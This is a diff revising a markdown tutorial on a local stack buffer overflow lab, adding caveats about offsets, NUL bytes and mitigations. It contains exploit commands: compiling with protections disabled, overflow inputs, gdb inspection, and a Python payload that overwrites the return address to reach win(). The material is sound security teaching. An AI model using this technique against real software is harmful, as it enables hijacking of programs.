@@ -22,23 +22,30 @@ There is also a `win()` function that normal execution never calls. The exploit 
 gcc -std=c99 -g -fno-stack-protector -no-pie 04-buffer-overflow/vuln.c -o /tmp/vuln
 ```
 
-`-fno-stack-protector` removes the stack canary and `-no-pie` keeps the addresses fixed, so the overflow is visible and `win()` lives at the same place every run.
+These options disable the stack protector and PIE for this build where supported.
+Addresses and mitigation behavior depend on the platform and build; inspect the
+actual binary and runtime rather than assuming an address is fixed.
 
 ## Find the offset
 
-The frame looks like this, low address to high:
+One possible x86-64 frame, from low address to high, is:
 
 ```
 buf[16] | saved rbp (8) | return address (8)
 ```
 
-So the buffer-to-return-address distance is **24 bytes**. Watch where each input lands:
+In that particular layout, the buffer-to-return-address distance is 24 bytes.
+Compiler choices, architecture, alignment and protections can change the layout
+and offset. Determine the offset for the build being examined. A 16-byte buffer
+holds at most 15 characters plus the terminating NUL; 16 characters require 17
+bytes and already overflow. The following inputs illustrate lengths, not
+guaranteed outcomes:
 
 ```bash
-/tmp/vuln AAAAAAAAAAAAAAAA            # 16 bytes  -> safe, returns normally
-/tmp/vuln $(python3 -c 'print("A"*24)')   # overwrites the saved frame pointer
-/tmp/vuln $(python3 -c 'print("A"*32)')   # overwrites the return address -> crash
-/tmp/vuln $(python3 -c 'print("A"*40)')   # return address fully controlled
+/tmp/vuln AAAAAAAAAAAAAAA                 # 15 characters + NUL fit in buf
+/tmp/vuln AAAAAAAAAAAAAAAA                # 16 characters + NUL overflow buf
+/tmp/vuln $(python3 -c 'print("A"*24)')   # 24 characters + NUL
+/tmp/vuln $(python3 -c 'print("A"*32)')   # 32 characters + NUL
 ```
 
 Under gdb you can see it directly:
@@ -47,19 +54,24 @@ Under gdb you can see it directly:
 gdb /tmp/vuln
 (gdb) break vulnerable
 (gdb) run AAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
-(gdb) x/8gx $rsp        # inspect the frame; the B's land on the return address
+(gdb) x/8gx $rsp        # inspect the frame for this build
 (gdb) info frame
 ```
 
 ## Hijack control flow
 
-`main()` prints `win()`'s address. Pad 24 bytes to reach the return address, then overwrite it with that address (little-endian):
+`main()` prints `win()`'s address. For a build verified to have a 24-byte offset
+and a little-endian 64-bit address, the following illustrates the payload shape.
+Replace the offset and address with values measured for that build. Command-line
+arguments cannot contain embedded NUL bytes, so an address containing one cannot
+be passed intact this way:
 
 ```bash
 /tmp/vuln $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*24 + (0xADDR).to_bytes(8,"little"))')
 ```
 
-On `ret`, the CPU pops the address you wrote and jumps to `win()`. That is the whole shape of control-flow hijacking in one input.
+If the overwrite reaches the return address intact and mitigations do not stop it,
+the return can transfer control to `win()`.
 
 ## Turn the mitigations back on
 
